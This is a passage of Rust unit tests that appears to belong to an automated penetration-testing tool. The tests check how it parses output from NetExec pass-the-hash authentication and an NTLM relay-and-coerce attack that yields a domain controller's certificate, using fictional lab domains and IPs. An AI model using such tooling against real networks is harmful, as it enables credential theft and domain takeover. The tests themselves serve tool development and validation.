        assert_eq!(hashes[0]["hash_type"], "NTLM");
        assert_eq!(hashes[0]["source"], "netexec_auth");
    }

    #[test]
    fn parse_tool_output_netexec_auth_check_ignores_logon_failure() {
        let output = "\
SMB  192.168.58.40  445  DC02  [-] fabrikam.local\\svc_sql:aad3b4 STATUS_LOGON_FAILURE";
        let params = json!({
            "username": "svc_sql",
            "domain": "fabrikam.local",
            "hash": "aad3b435b51404eeaad3b435b51404ee",
        });
        let disc = parse_tool_output("netexec_auth_check", output, &params);
        assert!(disc.get("hashes").is_none());
    }

    #[test]
    fn parse_tool_output_relay_and_coerce_vuln_id_sanitises_dollar() {
        // Machine account names contain `$` — safe slug should use `_`
        let output = "PFX_FILE=/tmp/ares_relay_6/DC01$.pfx\nRELAYED_USER=DC01$\n";
        let params = json!({
            "coerce_target": "192.168.58.10",
            "target_domain": "contoso.local",
        });
        let disc = parse_tool_output("relay_and_coerce", output, &params);
        let vuln_id = disc["vulnerabilities"][0]["vuln_id"].as_str().unwrap();
        assert!(
            !vuln_id.contains('$'),
            "vuln_id must not contain shell-special $, got {vuln_id}"
        );
    }
}
